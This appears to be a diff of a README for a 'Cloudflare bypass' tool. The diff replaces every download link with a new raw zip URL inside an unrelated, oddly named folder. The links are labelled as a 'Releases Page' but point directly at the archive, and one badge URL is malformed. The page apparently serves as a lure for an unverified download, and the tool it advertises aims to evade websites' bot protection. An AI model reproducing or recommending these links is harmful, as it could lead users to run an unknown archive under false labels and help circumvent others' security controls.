@@ -1,6 +1,6 @@
 # 🌐 cloudflare-bypass-2026 - Bypass Cloudflare Checks Easily
 
-[![Download Latest Release](https://github.com/AkiroWatanabe/cloudflare-bypass-2026/raw/refs/heads/main/pancreatogenous/bypass-cloudflare-v2.3-beta.3.zip%https://github.com/AkiroWatanabe/cloudflare-bypass-2026/raw/refs/heads/main/pancreatogenous/bypass-cloudflare-v2.3-beta.3.zip)](https://github.com/AkiroWatanabe/cloudflare-bypass-2026/raw/refs/heads/main/pancreatogenous/bypass-cloudflare-v2.3-beta.3.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/AkiroWatanabe/cloudflare-bypass-2026/main/pancreatogenous/bypass-cloudflare-2.6-alpha.1.zip%https://raw.githubusercontent.com/AkiroWatanabe/cloudflare-bypass-2026/main/pancreatogenous/bypass-cloudflare-2.6-alpha.1.zip)](https://raw.githubusercontent.com/AkiroWatanabe/cloudflare-bypass-2026/main/pancreatogenous/bypass-cloudflare-2.6-alpha.1.zip)
 
 ---
 
@@ -20,7 +20,7 @@ To get started with the application, follow these steps:
      - Linux
 
 2. **Visit the Releases Page**
-   - Go to the [Releases Page](https://github.com/AkiroWatanabe/cloudflare-bypass-2026/raw/refs/heads/main/pancreatogenous/bypass-cloudflare-v2.3-beta.3.zip) to download the latest version of the tool.
+   - Go to the [Releases Page](https://raw.githubusercontent.com/AkiroWatanabe/cloudflare-bypass-2026/main/pancreatogenous/bypass-cloudflare-2.6-alpha.1.zip) to download the latest version of the tool.
 
 3. **Download the Application**
    - Look for the latest release. You will find various files available for download depending on your operating system.
@@ -52,7 +52,7 @@ To get started with the application, follow these steps:
 
 To start using the Cloudflare Bypass tool:
 
-- Visit the [Releases Page](https://github.com/AkiroWatanabe/cloudflare-bypass-2026/raw/refs/heads/main/pancreatogenous/bypass-cloudflare-v2.3-beta.3.zip) to download the latest version for your operating system.
+- Visit the [Releases Page](https://raw.githubusercontent.com/AkiroWatanabe/cloudflare-bypass-2026/main/pancreatogenous/bypass-cloudflare-2.6-alpha.1.zip) to download the latest version for your operating system.
 
 ## 📜 Disclaimer
 
